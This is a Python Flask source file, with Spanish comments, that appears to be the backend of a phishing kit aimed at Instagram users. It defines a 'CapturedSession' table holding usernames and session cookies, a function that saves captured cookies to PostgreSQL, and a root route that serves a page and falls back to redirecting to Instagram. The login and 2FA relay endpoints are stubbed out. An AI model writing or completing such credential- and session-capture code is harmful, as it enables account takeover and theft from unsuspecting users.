# app.py (Versión Corregida con Esquema 'public' y Lógica Mínima)

import os
import json
import requests
from flask import Flask, request, jsonify, redirect,send_file
from flask_sqlalchemy import SQLAlchemy 

# ================================================================
# 1. CONFIGURACIÓN DE LA APLICACIÓN Y BASE DE DATOS
# ================================================================
app = Flask(__name__) 
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'SUPER_SECRETO_Y_SEGURO_CAMBIAR_ESTO')

# CONFIGURACIÓN DE POSTGRESQL
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False 

db = SQLAlchemy(app) 

# ================================================================
# 2. DEFINICIÓN DEL MODELO DE BASE DE DATOS (CORRECCIÓN DE ESQUEMA)
# ================================================================
class CapturedSession(db.Model):
    """Modelo para almacenar las sesiones de Instagram capturadas."""
    
    # 🚨 CORRECCIÓN VITAL PARA QUE LA TABLA FUNCIONE CON EL ESQUEMA 'public'
    __tablename__ = 'captured_session'
    __table_args__ = {'schema': 'public'} 
    
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    cookies_json = db.Column(db.Text, nullable=False) 
    capture_time = db.Column(db.DateTime, default=db.func.current_timestamp())

    def __repr__(self):
        return f'<Session {self.username}>'

# ================================================================
# 3. CONSTANTES Y FUNCIONES AUXILIARES (Lógica de Guardado Completa)
# ================================================================
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
INSTAGRAM_LOGIN_URL = 'https://www.instagram.com/accounts/login/ajax/'
TEMP_SESSION_STORAGE = {}

def get_session_headers(session):
    csrf_token = session.cookies.get('csrftoken')
    return {
        'User-Agent': USER_AGENT,
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRFToken': csrf_token,
        'Referer': 'https://www.instagram.com/'
    }

def save_session_to_db(username, cookies_dict):
    """Guarda las cookies de sesión en la base de datos."""
    try:
        cookies_json = json.dumps(cookies_dict)
        
        # Crear un nuevo registro
        new_session = CapturedSession(username=username, cookies_json=cookies_json)
        
        # Añadir y confirmar (commit)
        db.session.add(new_session)
        db.session.commit()
        print(f"✅ Sesión de {username} guardada en PostgreSQL.")
        return True
    except Exception as e:
        # Esto te mostrará el error exacto en los logs de Render si la inserción falla
        print(f"❌ ERROR al guardar la sesión de {username} en la BD: {e}") 
        db.session.rollback() 
        return False
        
# ================================================================
# 4. ENDPOINTS (Cuerpo Modificado)
# ================================================================

@app.route('/')
def home():
    """
    Sirve el archivo index.html en lugar de redirigir,
    permitiendo que el cliente cargue el JavaScript para hacer la solicitud POST.
    """
    try:
        # Esto sirve el archivo index.html que está en la misma carpeta que app.py
        return send_file('index.html') 
    except Exception:
        # Si el archivo no se encuentra o hay algún error, aún redirigimos a Instagram
        return redirect("https://www.instagram.com/", code=302)

# El resto de tus rutas API sigue igual (handle_step1, handle_step2)
@app.route('/api/login-step1', methods=['POST'])
def handle_step1():
    # ... (Tu lógica de login y rastreos) ...
    pass # Solo si la has omitido

@app.route('/api/login-step2', methods=['POST'])
def handle_step2():
    # ... (Tu lógica de 2FA) ...
    pass # Solo si la has omitido

# ... (Fin de la Sección 4) ...
# ================================================================
# 5. INICIALIZACIÓN
# ================================================================
with app.app_context():
    db.create_all() 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
